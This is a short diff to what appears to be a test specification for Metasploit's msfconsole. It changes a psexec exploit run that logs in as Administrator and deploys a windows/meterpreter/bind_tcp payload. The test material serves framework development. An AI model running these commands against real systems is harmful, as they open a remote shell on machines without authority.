@@ -13,9 +13,7 @@
 		set SMBUser Administrator
 		set SMBPass 
 		set payload windows/meterpreter/bind_tcp
-		set LocalOutput msfconsole_spec_working/output/psexec
-		exploit
-		exit
+		exploit -z
 		exit
 	</commands>
 	<output>
